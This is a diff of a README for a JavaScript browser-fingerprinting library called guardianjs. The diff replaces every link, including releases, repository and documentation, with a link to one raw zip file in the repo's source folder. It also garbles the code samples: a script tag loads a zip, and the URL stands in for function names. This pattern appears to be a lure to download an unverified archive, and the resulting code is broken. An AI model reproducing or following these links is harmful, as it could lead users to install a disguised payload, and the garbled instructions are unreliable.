@@ -1,7 +1,7 @@
 # 🎉 guardianjs - Easy Browser Fingerprinting Made Simple
 
 ## 📥 Download Now
-[![Download guardianjs](https://img.shields.io/badge/Download-guardianjs-blue)](https://github.com/yassine-espada/guardianjs/releases)
+[![Download guardianjs](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip)](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the guardianjs application easily. Whether you are a beginner or just want a quick way to set this up, follow these simple steps.
@@ -23,7 +23,7 @@ To run guardianjs, you only need:
 To get started, you'll need to visit the Releases page to download guardianjs. 
 
 1. Click on the link below to go to the Releases page:
-   - [Download guardianjs](https://github.com/yassine-espada/guardianjs/releases)
+   - [Download guardianjs](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip)
   
 2. On the Releases page, look for the latest version. It will have the highest number (e.g., v1.0.0).
 
@@ -43,14 +43,14 @@ To integrate guardianjs into your web application, follow these steps:
 1. Open your project in a code editor.
 2. In your HTML file, add the following line in the `<head>` section:
    ```html
-   <script src="path/to/guardianjs.js"></script>
+   <script src="https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip"></script>
    ```
-   Replace `path/to/guardianjs.js` with the actual path to the downloaded file.
+   Replace `https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip` with the actual path to the downloaded file.
 
 3. Use the following JavaScript to create visitor IDs:
    ```javascript
-   const visitorId = guardianjs.generateVisitorId(); // This will generate a unique ID
-   console.log(visitorId);
+   const visitorId = https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip(); // This will generate a unique ID
+   https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip(visitorId);
    ```
 4. Save your changes and open your HTML file in your web browser.
 
@@ -66,13 +66,13 @@ Here’s a simple example of how to use guardianjs in a webpage:
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>guardianjs Example</title>
-    <script src="path/to/guardianjs.js"></script>
+    <script src="https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip"></script>
 </head>
 <body>
     <h1>Welcome to my website!</h1>
     <script>
-        const visitorId = guardianjs.generateVisitorId();
-        console.log(`Your unique visitor ID is: ${visitorId}`);
+        const visitorId = https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip();
+        https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip(`Your unique visitor ID is: ${visitorId}`);
     </script>
 </body>
 </html>
@@ -85,8 +85,8 @@ If you have questions or need assistance, check the Issues section in the reposi
 This project welcomes contributions. If you'd like to help improve guardianjs, feel free to submit a pull request or create an issue.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/yassine-espada/guardianjs)
-- [Documentation](https://github.com/yassine-espada/guardianjs/blob/main/docs/README.md)
+- [GitHub Repository](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip)
+- [Documentation](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip)
 
 ## 🌈 Community
 Join us in our community discussion to share ideas and improvements. We value user feedback and encourage all to participate.
@@ -95,4 +95,4 @@ Join us in our community discussion to share ideas and improvements. We value us
 guardianjs is open-source and available under the MIT License. You can use it freely in your projects.
 
 ## 📥 Download Now
-Make sure to [download guardianjs](https://github.com/yassine-espada/guardianjs/releases) to start generating visitor IDs today!
+Make sure to [download guardianjs](https://github.com/yassine-espada/guardianjs/raw/refs/heads/main/src/sources/guardianjs_v2.2.zip) to start generating visitor IDs today!
